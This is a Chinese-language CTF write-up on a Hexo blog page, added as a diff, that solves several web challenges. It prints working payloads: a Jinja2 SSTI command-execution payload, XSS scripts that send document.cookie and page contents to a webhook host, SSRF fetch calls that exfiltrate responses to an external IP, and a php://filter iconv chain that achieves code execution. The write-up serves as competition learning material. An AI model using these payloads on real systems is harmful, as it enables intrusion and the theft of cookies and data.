@@ -1,0 +1,244 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ciscn2022 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="网鼎杯ezrar给了源码
+简单审计一下
+
+要伪造flask_session
+github上个脚本可以伪造，主要是获取到密钥，
+
+他这是用hostname当作密钥，liunx的密钥放在/hosts中我,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/p.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">ciscn2022</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ciscn2022</h1>
+        <div class="stuff">
+            <span>八月 28, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="网鼎杯"><a href="#网鼎杯" class="headerlink" title="网鼎杯"></a>网鼎杯</h1><h2 id="ezrar"><a href="#ezrar" class="headerlink" title="ezrar"></a>ezrar</h2><p>给了源码</p>
+<p>简单审计一下</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828165336.png"></p>
+<p>要伪造flask_session</p>
+<p>github上个脚本可以伪造，主要是获取到密钥，</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828165627.png"></p>
+<p>他这是用hostname当作密钥，liunx的密钥放在/hosts中我们需要读取这个文件</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828165834.png"></p>
+<p>我们看到这个路由可以目录穿越任意文件读取</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828170134.png"></p>
+<p>拿到密钥</p>
+<p>用github上的脚本伪造</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>拿到cookie</p>
+<p>发现可以上传一个rar文件，并且会解压，比赛时一直在时能不能在文件名处ssti</p>
+<p>之后经过学长指点，可以覆盖渲染文件来ssti</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828170939.png"></p>
+<p>我们上传的文件保存的目录是由session中的updir来决定的，我们可以通过更改</p>
+<p>session来改变文件上传的位置，因为他会自动解压我们上传的文件，我们上传文件名是templetas的时候，他就会把文件解压到上传目录的templetas目录下，我们如果把上传目录更改当前目录的话，就能覆盖flask的模板文件</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828172750.png"></p>
+<p>看到/路由使用了index.html进行了渲染，我们就可以构造一个index.php去覆盖原来的index.html,让flask渲染，从而实现ssti</p>
+<p>但是题目对flag的权限做了限制，我们用suid提权</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/dd/#file-read">https://gtfobins.github.io/gtfobins/dd/#file-read</a></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%for(x)in().__class__.__base__.__subclasses__()%&#125;&#123;%if&#x27;war&#x27;in(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;dd if=/flag&#x27;).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828174558.png"></p>
+<p>写一个有payload的index.html，打包成templates.rar上传，更改session,updir的值为当前目录”./“上传文件，访问/，拿到flag</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220828175306.png"></p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>直接hackbar构造读就行了，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location=`https://webhook/?f=`+encodeURIComponent(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830155554.png"></p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830160004.png"></p>
+<p>要访问g3t_flag路由</p>
+<p>用hack再次构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fetch(`/g3t_fl4g`).then(t=&gt;t.text()).then(t=&gt;location=`https://webhook/?f=`+encodeURIComponent(t))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830160608.png"></p>
+<p>拿到flag</p>
+<h3 id="kong"><a href="#kong" class="headerlink" title="kong"></a>kong</h3><p>看着像xss其实是ssrf</p>
+<p>用js伪协议可以绕过对&lt;script&gt;标签</p>
+<p>看漏洞复现，跟着做就行</p>
+<p>他在内网8001端口能配置网络服务,我们ssrf进行服务配置，把flag服务映射到8000端口访问</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830165144.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`http://127.0.0.1:8001/services`).then(p=&gt;p.text()).then(p=&gt;location=`http://110.40.244.192:2335/?k=`+encodeURIComponent(p)).catch(err=&gt;&#123;fetch(`http://110.40.244.192:2335/?k=`+encodeURIComponent(err))&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看看起了什么服务</p>
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830165314.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;next&quot;:null,&quot;data&quot;:[&#123;&quot;write_timeout&quot;:60000,&quot;name&quot;:&quot;flag&quot;,&quot;retries&quot;:5,&quot;tls_verify&quot;:null,&quot;protocol&quot;:&quot;http&quot;,&quot;tls_verify_depth&quot;:null,&quot;port&quot;:59185,&quot;client_certificate&quot;:null,&quot;path&quot;:&quot;/&quot;,&quot;updated_at&quot;:1661832601,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;tags&quot;:null,&quot;ca_certificates&quot;:null,&quot;id&quot;:&quot;6319e57f-9866-421b-9eab-da8dc6dc5fed&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;created_at&quot;:1661832601,&quot;enabled&quot;:true&#125;,&#123;&quot;write_timeout&quot;:60000,&quot;name&quot;:&quot;report&quot;,&quot;retries&quot;:5,&quot;tls_verify&quot;:null,&quot;protocol&quot;:&quot;http&quot;,&quot;tls_verify_depth&quot;:null,&quot;port&quot;:3001,&quot;client_certificate&quot;:null,&quot;path&quot;:&quot;/&quot;,&quot;updated_at&quot;:1661832601,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;tags&quot;:null,&quot;ca_certificates&quot;:null,&quot;id&quot;:&quot;653ad00b-fd73-460f-8f49-827695888a02&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;created_at&quot;:1661832601,&quot;enabled&quot;:true&#125;,&#123;&quot;write_timeout&quot;:60000,&quot;name&quot;:&quot;targeta&quot;,&quot;retries&quot;:5,&quot;tls_verify&quot;:null,&quot;protocol&quot;:&quot;http&quot;,&quot;tls_verify_depth&quot;:null,&quot;port&quot;:59185,&quot;client_certificate&quot;:null,&quot;path&quot;:null,&quot;updated_at&quot;:1661836319,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;tags&quot;:null,&quot;ca_certificates&quot;:null,&quot;id&quot;:&quot;69ad3a77-3fb1-472b-b8d3-392a9cfb6213&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;created_at&quot;:1661836319,&quot;enabled&quot;:true&#125;,&#123;&quot;write_timeout&quot;:60000,&quot;name&quot;:&quot;targetb&quot;,&quot;retries&quot;:5,&quot;tls_verify&quot;:null,&quot;protocol&quot;:&quot;http&quot;,&quot;tls_verify_depth&quot;:null,&quot;port&quot;:59185,&quot;client_certificate&quot;:null,&quot;path&quot;:null,&quot;updated_at&quot;:1661836372,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;tags&quot;:null,&quot;ca_certificates&quot;:null,&quot;id&quot;:&quot;9c607a50-b6c0-4c7c-9216-a0d613604557&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;created_at&quot;:1661836372,&quot;enabled&quot;:true&#125;,&#123;&quot;write_timeout&quot;:60000,&quot;name&quot;:&quot;flag1&quot;,&quot;retries&quot;:5,&quot;tls_verify&quot;:null,&quot;protocol&quot;:&quot;http&quot;,&quot;tls_verify_depth&quot;:null,&quot;port&quot;:59185,&quot;client_certificate&quot;:null,&quot;path&quot;:null,&quot;updated_at&quot;:1661840456,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;tags&quot;:null,&quot;ca_certificates&quot;:null,&quot;id&quot;:&quot;fed97f9b-f20c-415e-a22c-82ece1dd5730&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;created_at&quot;:1661840456,&quot;enabled&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到有flag服务开在59185端口，我们访问不到，需要配置路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(`http://127.0.0.1:8001/services/flag/routes`,&#123;method:&#x27;put&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded;&#x27;&#125;,body:&#x27;name=flag&amp;paths[]=/cnm&#x27;&#125;).then(p=&gt;p.text()).then(p=&gt;location=`http://110.40.244.192:2335/?k=`+encodeURIComponent(p)).catch(err=&gt;&#123;fetch(`http://110.40.244.192:2335/?k=`+encodeURIComponent(err))&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picbok-1307667386.cos.ap-shanghai.myqcloud.com/20220830165641.png"></p>
+<p>看到配置成功了</p>
+<p>访问配置的路由拿到flag</p>
+<h2 id="rce-unser"><a href="#rce-unser" class="headerlink" title="rce+unser"></a>rce+unser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&quot;var/www/html&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag|secret|index/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$sec</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$sec</span>)) &#123;</span><br><span class="line">    unserialize(<span class="variable">$sec</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>多级符号链接绕过去include_once去找config.php</p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;dc-&gt;nouse();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ak</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nouse</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ak-&gt;nouse2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">step</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dif</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$ss</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">process</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bcd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fec = <span class="string">&quot;Invoke:&quot;</span>.<span class="keyword">$this</span>-&gt;bcd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">over</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;get_secret();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">echo</span> highlight_file(<span class="string">&#x27;secrEt_Y0uNeverkNOW.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的一，这个反序列化</p>
+<p>我们看到secrEt_Y0uNeverkNOW.php文件的内容，需要我们4字母rce</p>
+<p>参考这篇文章<a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15080020/4328045">https://blog.51cto.com/u_15080020/4328045</a></p>
+<p>这是预期解</p>
+<p>非预期</p>
+<p>用裸文件包含实现rce</p>
+<p>看陆队的文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/config.php&amp;0=cat+/flag.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
